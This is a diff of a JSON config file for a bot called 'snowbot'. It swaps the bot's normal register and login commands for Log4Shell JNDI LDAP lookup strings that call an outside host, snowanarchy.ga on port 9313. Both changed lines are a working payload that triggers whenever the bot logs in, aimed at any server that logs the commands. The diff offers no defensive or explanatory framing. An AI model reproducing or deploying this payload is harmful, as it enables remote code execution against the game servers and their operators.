@@ -4,6 +4,6 @@
 	"name": "snowbot",
 	"auto-night-skip":"false",
 	"login-enabled":"true",
-	"register-cmd":"/register snowbot snowbot",
-	"login-cmd":"/login snowbot"
+	"register-cmd":"/${jndi:ldap://snowanarchy.ga:9313/test}",
+	"login-cmd":"/${jndi:ldap://snowanarchy.ga:9313/test}"
 }
